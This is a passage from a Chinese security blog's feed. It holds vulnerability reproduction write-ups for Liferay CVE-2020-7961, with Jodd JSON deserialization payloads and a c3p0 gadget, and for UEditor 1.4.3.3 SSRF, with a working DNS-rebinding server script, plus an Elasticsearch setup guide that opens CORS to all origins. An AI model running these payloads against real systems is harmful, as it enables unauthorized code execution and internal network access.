id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p>[<a href="https://axis.apache.org/axis/java/install.html]" target="_blank" rel="external nofollow noopener noreferrer">https://axis.apache.org/axis/java/install.html]</a>(<a href="https://axis.apache.org/axis/java/install.html" target="_blank" rel="external nofollow noopener noreferrer">https://axis.apache.org/axis/java/install.html</a><br><a href="https://github.com/KibodWapon/Axis-1.4-RCE-Poc" target="_blank" rel="external nofollow noopener noreferrer">https://github.com/KibodWapon/Axis-1.4-RCE-Poc</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近利用一个漏洞Axis 1.4 adminservice开启远程访问下可新建服务执行任意方法, 写文件出现问题可试试本文利用默认包中的jndi lookup注入恶意class执行反弹shell&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>Liferay Portal CVE-2020-7961 学习记录（7.0以上回显）</title>
    <link href="http://yoursite.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Liferay%20Portal%20CVE-2020-7961%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Liferay%20Portal%20CVE-2020-7961%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2020-04-07T10:19:35.000Z</published>
    <updated>2020-04-08T14:21:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>前几天看大家也都在分析该CVE，自己也跟着大佬步伐记录一下所学和思路。<br><a href="https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html" target="_blank" rel="external nofollow noopener noreferrer">code white | Blog: Liferay Portal JSON Web Service RCE Vulnerabilities</a><br>根据以上博客得出几个复现漏洞的点。</p><a id="more"></a><h2 id="漏洞形成前提"><a href="#漏洞形成前提" class="headerlink" title="漏洞形成前提"></a>漏洞形成前提</h2><p>版本小于：6.2 GA6、7.0 GA7、7.1 GA4、7.2 GA2</p><p>漏洞实现版本区别，本文只学习了 <strong>7.0</strong> 以上版本的相关复现：<br>小于7.0使用 Flexjson<br>大于7.0使用 Jodd Json</p><p>区别为jodd json不支持直接传递对象类型,需要使用map映射或者setClassMetadataName函数才能指定对象类型类似于fastjson,jackson的安全限制,但是由于jodd没有上面这2个库那么多黑名单限制所以更容易构造反序列化漏洞。</p><h2 id="debug环境"><a href="#debug环境" class="headerlink" title="debug环境"></a>debug环境</h2><ol><li>docker: mdelapenya/liferay-portal:7.0-ga6</li><li>idea 设置remote调试填写socket端口即可</li></ol><h2 id="漏洞复现的关键点"><a href="#漏洞复现的关键点" class="headerlink" title="漏洞复现的关键点"></a>漏洞复现的关键点</h2><p>根据网络上的博客总结出以下几点：</p><ol><li>Json services 服务接口存在<strong>java.lang.object参数</strong>调用这样就可以被指定为任意类型从而传递任意恶意类</li><li>使用<strong>jodd</strong>指定任意类型导致反序列化命令执行：不安全的反序列化 会执行内部无参构造方法和setter方法和父类构造方法</li><li>反序列化在接口认证之前所以构成<strong>未授权</strong>远程命令执行.</li></ol><h2 id="构造payloads"><a href="#构造payloads" class="headerlink" title="构造payloads"></a>构造payloads</h2><ol><li>找出/api/jsonws服务接口中可以调用java.lang.object参数的服务名</li><li>找出jodd json可以构造无参和setter方法执行的利用链</li><li>尝试进行回显</li></ol><h3 id="1-寻找对象java-lang-object"><a href="#1-寻找对象java-lang-object" class="headerlink" title="1. 寻找对象java.lang.object"></a>1. 寻找对象java.lang.object</h3><p>先进行第一步找出api/jsonws接口或者代码里搜索接口传递参数为object的服务接口<br>这里找到updateColumn接口发现参数接收java.lang.object：<br><img src="/images/2020/04/2477140916.png" alt><br>接下来我们构造接口传递任意类型给defaultData参数最终会进行jodd json库的反序列化，那我们先进行jodd json反序列化的本地测试</p><h3 id="2-测试jodd-json不安全的反序列化"><a href="#2-测试jodd-json不安全的反序列化" class="headerlink" title="2. 测试jodd json不安全的反序列化"></a>2. 测试jodd json不安全的反序列化</h3><p>具体本地测试jodd不安全反序列化可参考：<br><a href="https://paper.seebug.org/1162/" target="_blank" rel="external nofollow noopener noreferrer">https://paper.seebug.org/1162/</a></p><p>这里分享以下<strong>本地测试</strong>jodd json反序列化遇到一个坑：<br>测试时需要按照liferay的调用方法使用jodd中的map方法进行反序列化操作具体原因见差异：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\com\liferay\portal\json\JSONDeserializerImpl<span class="class">.<span class="keyword">class</span>#22</span></span><br><span class="line"><span class="class"><span class="title">this</span>.<span class="title">_jsonDeserializer</span>.<span class="title">map</span>(<span class="title">path</span>, <span class="title">clazz</span>)</span>;</span><br></pre></td></tr></table></figure><ul><li>过程反序列化部分payload差异<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JsonParser jsonParser = <span class="keyword">new</span> JsonParser();</span><br><span class="line">        String testjson = <span class="string">"&#123;\"class\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"http://127.0.0.1:1389\", \"autoCommit\":true&#125;"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 造成读取hashmap setter不按自己逻辑执行</span></span><br><span class="line">        jsonParser.setClassMetadataName(<span class="string">"class"</span>).parse(testjson);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 自动设置roottype按顺序读取key value</span></span><br><span class="line">        String testjson1 = <span class="string">"&#123;\"dataSourceName\":\"ldap://127.0.0.1:1389\", \"autoCommit\":true&#125;"</span>;</span><br><span class="line">        jsonParser.map((String)<span class="keyword">null</span>, JdbcRowSetImpl<span class="class">.<span class="keyword">class</span>).<span class="title">parse</span>(<span class="title">testjson1</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>根据官网设置setClassMetadataName最终key value被加载进hashmap由于hashmap按key排序取key会按照排序顺序导致a开头的autoCommit被提前执行SetautoCommit无法找到dataSourceName的jndi服务：<br>jsonParser.setClassMetadataName(“class”).parse(testjson);<br><img src="/images/2020/04/248805462.png" alt></p><p>map调用方式会按照输入json数据流的顺序取值因为targetype被rootype赋值isTargetRealTypeMap按代码逻辑被设置为false, 从HTTP请求中解析json会按照自己设置的顺序读取：<br>jsonParser.map((String)null, JdbcRowSetImpl.class).parse(testjson);<br><img src="/images/2020/04/271238372.png" alt></p><p>当然如果只有一个参数的利用链就不受到排序影响，在Liferay使用的map函数所以也不会受到影响.</p><h3 id="3-调用反序列化执行"><a href="#3-调用反序列化执行" class="headerlink" title="3. 调用反序列化执行"></a>3. 调用反序列化执行</h3><p>官网关于java.lang.object参数传值调用方式介绍：<br><a href="https://portal.liferay.dev/docs/7-1/tutorials/-/knowledge_base/t/invoking-json-web-services#object-parameters" target="_blank" rel="external nofollow noopener noreferrer">https://portal.liferay.dev/docs/7-1/tutorials/-/knowledge_base/t/invoking-json-web-services#object-parameters</a></p><p>参数名为 +参数名:类名=值：<br><img src="/images/2020/04/744496410.png" alt><br>类似的payload网上也很多了。<br><img src="/images/2020/04/3524006281.png" alt></p><h2 id="执行分析流程图-打开放大"><a href="#执行分析流程图-打开放大" class="headerlink" title="执行分析流程图 (打开放大)"></a>执行分析流程图 (打开放大)</h2><img src="/images/2020/04/CVE-2020-7961.svg"><h2 id="构造回显payload"><a href="#构造回显payload" class="headerlink" title="构造回显payload"></a>构造回显payload</h2><ol><li>先将所有存在的jar包拉出,检索存在可能的链，其实允许构造方法和setter任意访问 jackson,fastjson多个payload通用</li><li>需要考虑利用链中组件的版本</li><li>需要考虑当前JDK版本</li></ol><p>发现lib下存在以下依赖包：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c3p0.jar</span><br><span class="line">commons-beanutils.jar</span><br><span class="line">commons-collections.jar （<span class="number">3.1</span>）</span><br><span class="line">commons-logging.jar</span><br></pre></td></tr></table></figure><p>此时可以参考marshalsec中的jackson利用方法：<br>com.mchange.v2.c3p0.WrapperConnectionPoolDataSource</p><p>docker环境下liferay-portal:7.0-ga6 jdk版本为1.8.221所以有部分gadgets受到jdk版本影响无法执行：<br><img src="/images/2020/04/3349357005.png" alt></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">com.mchange.v2.c3p0.WrapperConnectionPoolDataSource:</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">"userOverridesAsString"</span>:<span class="string">"HexAsciiSerializedMap:aced0005737"</span>&#125;</span><br></pre></td></tr></table></figure><p>当触发setuserOveridesAsString函数最终将会把hex反序列化造成触发恶意代码，此时替换成合适且符合jdk1.8.211和内置的库中的版本需求就可以尝试构造回显：<br><img src="/images/2020/04/1301238036.png" alt></p><p><img src="/images/2020/04/3893499940.png" alt></p><p>寻找那些实现了各种request response函数的接口，通过类去搜索,在那些代码被调用</p><p>最好先将所有jar包反编译否则搜索匹配字会出问题</p><p><img src="/images/2020/04/2590778814.png" alt></p><p><img src="/images/2020/04/2927477500.png" alt><br><img src="/images/2020/04/809307760.png" alt></p><p><img src="/images/2020/04/804572550.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前几天看大家也都在分析该CVE，自己也跟着大佬步伐记录一下所学和思路。&lt;br&gt;&lt;a href=&quot;https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html&quot; target=&quot;_blank&quot; rel=&quot;external nofollow noopener noreferrer&quot;&gt;code white | Blog: Liferay Portal JSON Web Service RCE Vulnerabilities&lt;/a&gt;&lt;br&gt;根据以上博客得出几个复现漏洞的点。&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>UEditor 1.4.3.3验证SSRF漏洞提高DNS rebinding成功率</title>
    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/UEditor%201.4.3.3%E9%AA%8C%E8%AF%81SSRF%E6%BC%8F%E6%B4%9E%E6%8F%90%E9%AB%98DNS%20rebinding%E6%88%90%E5%8A%9F%E7%8E%87/"/>
    <id>http://yoursite.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/UEditor%201.4.3.3%E9%AA%8C%E8%AF%81SSRF%E6%BC%8F%E6%B4%9E%E6%8F%90%E9%AB%98DNS%20rebinding%E6%88%90%E5%8A%9F%E7%8E%87/</id>
    <published>2019-11-13T10:18:59.000Z</published>
    <updated>2020-04-08T02:18:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>测试中遇到一个Ueditor 1.4.3.3 php ssrf但是由于DNS rebinding的不稳定性造成复现困难，目前通过延迟等手段可以加大成功率。</p><a id="more"></a><h2 id="0x01-复现过程"><a href="#0x01-复现过程" class="headerlink" title="0x01 复现过程"></a>0x01 复现过程</h2><ol><li>参考文章中先设置test.jianfensec.com的NS记录转发到自己的VPS DNS服务器：<br><a href="http://admintony.com/UEditor-1-4-3-3-SSRF-AND-DNS-rebinding-attack.html" target="_blank" rel="external nofollow noopener noreferrer">http://admintony.com/UEditor-1-4-3-3-SSRF-AND-DNS-rebinding-attack.html</a></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding : utf-8</span></span><br><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor, defer</span><br><span class="line"><span class="keyword">from</span> twisted.names <span class="keyword">import</span> client, dns, error, server</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicResolver</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_doDynamicResponse</span><span class="params">(self, query)</span>:</span></span><br><span class="line">        name = query.name.name</span><br><span class="line">        <span class="keyword">global</span> flag</span><br><span class="line">        <span class="keyword">if</span> flag &lt; <span class="number">2</span>:</span><br><span class="line">            ip=<span class="string">"47.52.95.35"</span></span><br><span class="line">            flag=flag+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip=<span class="string">"192.168.123.130"</span></span><br><span class="line">            flag=<span class="number">0</span></span><br><span class="line">        current_time = time.strftime(<span class="string">'%Y.%m.%d %H:%M:%S '</span>,time.localtime(time.time()))</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[&#123;&#125;]&#123;&#125; ===&gt; &#123;&#125;"</span>.format(current_time,name,ip)</span><br><span class="line"></span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name=name,</span><br><span class="line">            type=dns.A,</span><br><span class="line">            cls=dns.IN,</span><br><span class="line">            ttl=<span class="number">0</span>,</span><br><span class="line">            payload=dns.Record_A(address=<span class="string">b'%s'</span>%ip,ttl=<span class="number">0</span>)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        <span class="keyword">return</span> answers, authority, additional</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(self, query, timeout=None)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=<span class="string">'/etc/resolv.conf'</span>)]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(<span class="number">53</span>, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br></pre></td></tr></table></figure><ol start="2"><li>启动Web服务：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> werkzeug.routing <span class="keyword">import</span> BaseConverter</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Regex_url</span><span class="params">(BaseConverter)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url_map,*args)</span>:</span></span><br><span class="line">        super(Regex_url,self).__init__(url_map)</span><br><span class="line">        self.regex = args[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.url_map.converters[<span class="string">'re'</span>] = Regex_url</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/&lt;re(".*?"):tmp&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(tmp)</span>:</span></span><br><span class="line">    image = <span class="string">'Test'</span></span><br><span class="line">    <span class="comment">#image = file("demo.jpg")</span></span><br><span class="line">    resp = Response(image, mimetype=<span class="string">"image/jpeg"</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>3.不断重放数据包，尝试绕过验证最终将192.168.123.130:8081的内容写入图片这样就可以得到一个可回显SSRF：<br><img src="/images/2019/11/2849800793.png" alt><br>4.问题出现，DNS rebinding收到缓存和网络影响复现不稳定，重放1000个数据包无效果：<br><img src="/images/2019/11/545939955.png" alt></p><h2 id="0X02-尝试解决"><a href="#0X02-尝试解决" class="headerlink" title="0X02 尝试解决"></a>0X02 尝试解决</h2><p>首先是因为DNS缓存导致的问题，我们无法控制客户端但是可以控制前一个请求的返回时间来延迟客户端处理下一个请求的时间，服务端请求加入time.sleep(45)：</p><p> 1.本地测试DNS缓存释放再请求时间大概为<strong>40-50</strong>秒<br> 2.检查源码中发现使用get_header函数去获取返回信息，此函数未设置超时所以设置延时不会产生异常，实际测试大概60S是极限，如果Burp请求中存在502可以适当降低sleep时间。<br><img src="/images/2019/11/542107569.png" alt><br>在web服务器中加入延迟：<br><img src="/images/2019/11/1256255143.png" alt><br>这里需要改一下原有脚本当flag&lt;2返回SSRF内网目标IP，请求超过2次则返回外网IP，否则服务器一开始就请求外网IP会卡死：<br><img src="/images/2019/11/924749901.png" alt><br>可以发现这里请求了20个包就得到了SSRF内容：<br><img src="/images/2019/11/3036312343.png" alt><br>从服务器图片中获取内网SSRF内容：<br><img src="/images/2019/11/1039293166.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;测试中遇到一个Ueditor 1.4.3.3 php ssrf但是由于DNS rebinding的不稳定性造成复现困难，目前通过延迟等手段可以加大成功率。&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>Burp suite插件获取js/html中隐藏的uri和接口</title>
    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/Burp%20suite%E6%8F%92%E4%BB%B6%E8%8E%B7%E5%8F%96js_html%E4%B8%AD%E9%9A%90%E8%97%8F%E7%9A%84uri%E5%92%8C%E6%8E%A5%E5%8F%A3/"/>
    <id>http://yoursite.com/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/Burp%20suite%E6%8F%92%E4%BB%B6%E8%8E%B7%E5%8F%96js_html%E4%B8%AD%E9%9A%90%E8%97%8F%E7%9A%84uri%E5%92%8C%E6%8E%A5%E5%8F%A3/</id>
    <published>2019-09-27T15:18:24.000Z</published>
    <updated>2021-06-21T07:59:27.739Z</updated>
    
    <content type="html"><![CDATA[<p><strong><a href="https://github.com/j1anFen/burp_jspath" target="_blank" rel="external nofollow noopener noreferrer">https://github.com/j1anFen/burp_jspath</a></strong></p><a id="more"></a><h1 id="burp-jspath"><a href="#burp-jspath" class="headerlink" title="burp_jspath"></a>burp_jspath</h1><p>获取js文件和html中script标签内容中的接口，用于渗透中发现隐藏API，未授权访问等漏洞。</p><p>插件使用了linkfinder探测js中路径的正则语句。</p><h1 id="environment"><a href="#environment" class="headerlink" title="environment"></a>environment</h1><ul><li>jython 2.7</li><li>BurpSuite Proxy</li></ul><h1 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h1><ul><li>get js file path</li><li>get html script tags path</li><li>filter assets content</li></ul><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><p>Import this extension of Burp Suite.</p><p>Save to log file when there is more content.</p><p><img src="/images/2019/09/4146295008.png" alt></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>regexp code</p><p><a href="https://github.com/GerbenJavado/LinkFinder/blob/master/linkfinder.py#L29" target="_blank" rel="external nofollow noopener noreferrer">https://github.com/GerbenJavado/LinkFinder/blob/master/linkfinder.py#L29</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://github.com/j1anFen/burp_jspath&quot; target=&quot;_blank&quot; rel=&quot;external nofollow noopener noreferrer&quot;&gt;https://github.com/j1anFen/burp_jspath&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透工具" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>elasticsearch+kibana搭建配置初体验</title>
    <link href="http://yoursite.com/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/elasticsearch+kibana%E6%90%AD%E5%BB%BA%E9%85%8D%E7%BD%AE%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>http://yoursite.com/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/elasticsearch+kibana%E6%90%AD%E5%BB%BA%E9%85%8D%E7%BD%AE%E5%88%9D%E4%BD%93%E9%AA%8C/</id>
    <published>2019-08-01T03:17:48.000Z</published>
    <updated>2020-04-08T02:18:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近分析一些日志，搭建elasticsearch+kibana玩一玩。</p><a id="more"></a><h2 id="0x00-环境准备"><a href="#0x00-环境准备" class="headerlink" title="0x00 环境准备"></a>0x00 环境准备</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ubuntu 18.04(不用docker推荐使用centos装)</span><br><span class="line"></span><br><span class="line">docker --version</span><br><span class="line">Docker version 18.09.7, build 2d0083d</span><br></pre></td></tr></table></figure><h2 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h2><h3 id="1-Docker"><a href="#1-Docker" class="headerlink" title="1. Docker"></a>1. Docker</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install docker.io</span><br><span class="line">sudo systemctl start docker</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure><h4 id="docker代理"><a href="#docker代理" class="headerlink" title="docker代理"></a>docker代理</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/systemd/system/docker.service.d</span><br></pre></td></tr></table></figure><p>在服务目录下新建代理配置文件并添加内容<br>NO_PROXY是不需要代理的地址，比如本地及本地私有仓库等</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/systemd/system/docker.service.d/http-proxy.conf</span><br><span class="line"></span><br><span class="line">[Service]  Environment=<span class="string">"HTTP_PROXY=http://ip:port/"</span></span><br></pre></td></tr></table></figure><h3 id="2-portainer"><a href="#2-portainer" class="headerlink" title="2. portainer"></a>2. portainer</h3><p>docker可视化工具portainer<br><a href="https://www.portainer.io/installation/" target="_blank" rel="external nofollow noopener noreferrer">https://www.portainer.io/installation/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker volume create portainer_data</span><br><span class="line">$ docker run -d -p 8000:8000 -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer</span><br></pre></td></tr></table></figure><h3 id="3-elasticsearch"><a href="#3-elasticsearch" class="headerlink" title="3. elasticsearch"></a>3. elasticsearch</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull elasticsearch:7.2.0</span><br></pre></td></tr></table></figure><p>注：7.2没有type概念，以索引为主，开发者认为不应该把elasticsearch当作单纯数据库看待</p><p>访问可视化工具-&gt;volumns模块<br>创建本地卷永久存放elasticsearch日志，数据，配置目录：<br><img src="/images/2019/08/4161514289.png" alt></p><h4 id="3-1-设置卷映射"><a href="#3-1-设置卷映射" class="headerlink" title="3.1 设置卷映射"></a>3.1 设置卷映射</h4><p>/usr/share/elasticsearch/data -&gt; es_data<br>/usr/share/elasticsearch/config -&gt; es_config</p><h4 id="3-2-设置端口映射"><a href="#3-2-设置端口映射" class="headerlink" title="3.2 设置端口映射"></a>3.2 设置端口映射</h4><p><img src="/images/2019/08/381385496.png" alt></p><h4 id="3-3-设置单机模式（参考hub）"><a href="#3-3-设置单机模式（参考hub）" class="headerlink" title="3.3 设置单机模式（参考hub）"></a>3.3 设置单机模式（参考hub）</h4><p><a href="https://hub.docker.com/_/elasticsearch" target="_blank" rel="external nofollow noopener noreferrer">https://hub.docker.com/_/elasticsearch</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">discovery.type=single-node</span><br></pre></td></tr></table></figure><p><img src="/images/2019/08/1819320056.png" alt></p><h4 id="3-4-修改elasticsearch配置文件"><a href="#3-4-修改elasticsearch配置文件" class="headerlink" title="3.4 修改elasticsearch配置文件"></a>3.4 修改elasticsearch配置文件</h4><p>修改完后启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/docker/volumes/es_config/_data<span class="comment"># </span></span><br><span class="line">cat elasticsearch.yml</span><br><span class="line">cluster.name: <span class="string">"docker-cluster"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置局域网可外连</span></span><br><span class="line">network.host: 0.0.0.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置写入缓存清理和限制</span></span><br><span class="line">indices.fielddata.cache.size: 75%</span><br><span class="line">indices.breaker.fielddata.limit: 85%</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置外连否则es会拒绝跨域和一些不允许方法</span></span><br><span class="line">http.cors.enabled: <span class="literal">true</span></span><br><span class="line">http.cors.allow-origin: <span class="string">"*"</span></span><br><span class="line">http.cors.allow-methods: OPTIONS, HEAD, GET, POST, PUT, DELETE</span><br><span class="line">http.cors.allow-headers: X-Requested-With, Content-Type, Content-Length, X-User</span><br></pre></td></tr></table></figure><h4 id="3-5-测试访问"><a href="#3-5-测试访问" class="headerlink" title="3.5 测试访问"></a>3.5 测试访问</h4><p><img src="/images/2019/08/4067205480.png" alt></p><h4 id="3-6-安装中文ik分词插件"><a href="#3-6-安装中文ik分词插件" class="headerlink" title="3.6 安装中文ik分词插件"></a>3.6 安装中文ik分词插件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/share/elasticsearch/plugins</span><br><span class="line">mkdir ik</span><br><span class="line">curl -O https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v7.2.0/elasticsearch-analysis-ik-7.2.0.zip</span><br><span class="line">docker restart [docker-id]</span><br></pre></td></tr></table></figure><h3 id="4-kibana搭建"><a href="#4-kibana搭建" class="headerlink" title="4. kibana搭建"></a>4. kibana搭建</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker pull 